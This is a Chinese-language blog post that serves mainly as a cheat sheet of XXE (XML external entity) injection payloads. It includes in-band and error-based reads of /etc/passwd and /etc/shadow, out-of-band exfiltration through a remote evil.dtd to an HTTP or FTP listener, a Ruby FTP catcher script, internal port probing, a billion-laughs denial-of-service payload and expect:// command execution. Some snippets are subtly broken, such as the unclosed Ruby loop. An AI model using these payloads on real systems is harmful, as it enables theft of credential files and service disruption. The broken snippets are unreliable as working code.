---
title: XXE 漏洞
categories: 漏洞
date: 2020-06-17 05:10:22
tags:
---
## 概念
XXE：就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。
<!--more-->
* 所有xml文档都由5种简单的构造模块（元素，属性，实体，PCDATA CDATA）构成
* CDATA 的意思是字符数据（character data）。
CDATA 是不会被解析器解析的文本，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记。
在读取包含了某些字符文件输出报错的时候，可使用CDATA进行绕过。

DTD：（文档类型定义）作用是定义 XML 文档的合法构建模块。可以在 XML 文档内声明，也可以外部引用。
## 利用
首先测试是否解析xml，修改Content-Type: application/xml发送测试代码
```
<?xml version="1.0"?>
    <!DOCTYPE ANY[
    <!ENTITY shit “this is test” >
]>
<root>$shit</root>
```
### 有回显读取敏感文件
基础payload
```
<?xml version="1.0"?>
    <!DOCTYPE GVI [<!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
```
```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % data3 SYSTEM "file:///etc/shadow">
<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
]>
<r>&data3;</r>
<r>&data;</r>
```
如果要读取的文件内容有<> &，被解析器解析出错了，可以使用<![CDATA[xxxx]]>不让其进行解析。
这里声明的另一种方式% 变量(有空格)，该方式只能在DTD中进行变量引用%变量，而不能在XML中引用。
在远程服务器创建DTD文件：evil.dtd
```
<?xml version="1.0" encoding="UTF-8"?> 
<!ENTITY xxe "%start;%body;%end;">
```
payload
```
<?xml version="1.0"?>
<!DOCTYPE GVI [
<!ENTITY % start "<![CDATA["> 
<!ENTITY % body SYSTEM "file:///etc/passwd" >
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://ip/evil.dtd">
%dtd;
]>
```
另外一种方法，利用报错
将含有参数实体的数据传递到另一个文件实体中，以便在访问第二个文件时触发文件未找到的异常，并且将第一个文件的内容作为第二个文件的名字，这样的话，就成功出发了文件未找到异常，也完全返回了第一个文件的内容。
payload
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY % one SYSTEM "http://ip/evil.dtd" >
    %one; %two; %four;
]>
```
evil.dtd
```
<!ENTITY % three SYSTEM "file:///etc/passwd">
<!ENTITY % two "<!ENTITY % four SYSTEM 'file:///%three;'>">
```
### 无回显读取敏感文件
payload
```
<?xml version="1.0"?>
    <!DOCTYPE data SYSTEM "http://ip/evil.dtd">
```
evil.dtd
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY data SYSTEM 'http://ip:9999/?%file;'>">
```
nc监听即可
另外一种payload
```
<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://ip/evil.dtd">
%remote;%int;%send;
]>
```
evil.dtd
```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#37 send SYSTEM 'http://ip:9999?p=%file;'>">
```
上面两种利用方式，在java中无法正常利用：虽然能获取到dtd文件，但是却没有发送数据。
### ftp协议读取敏感文件
payload
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://ip/evil.xml">
%remote;]>
<root/>
```
evil.xml
```
<!ENTITY % file SYSTEM "file:///etc/shadow">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'ftp://ip:33/%file;'>">
%int;
%send;
```
服务器监听，接收来自33端口的ftp信息
Ruby ftp.rb
```
require 'socket'
server = TCPServer.new 33
loop do
  Thread.start(server.accept) do |client|
    puts "New client connected"
    data = ""
    client.puts("220 xxe-ftp-server")
    loop {
        req = client.gets()
        puts "< "+req
        if req.include? "USER"
            client.puts("331 password please - version check")
        else
           #puts "> 230 more data please!"
            client.puts("230 more data please!")
        end
    }
  end
```
实际使用读取最后一行可能会出现丢失字符的现象，有待改进。
### 端口扫描
根据响应时间/长度，判断该端口是否开启
```
<?xml version="1.0"?>
    <!DOCTYPE GVI [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080" >
]>
```
### 其他

Dos攻击:著名的 billion laughs attack
```
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```
expect协议远程代码执行，很少发生
```
<?xml version="1.0"?>
    <!DOCTYPE GVI [ <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "expect://id" >]>
```

参考文章
https://www.jianshu.com/p/ec2888780308
https://xz.aliyun.com/t/3357#toc-4
https://www.cnblogs.com/r00tuser/p/7255939.html
http://www.voidcn.com/article/p-njawsjxm-ko.html


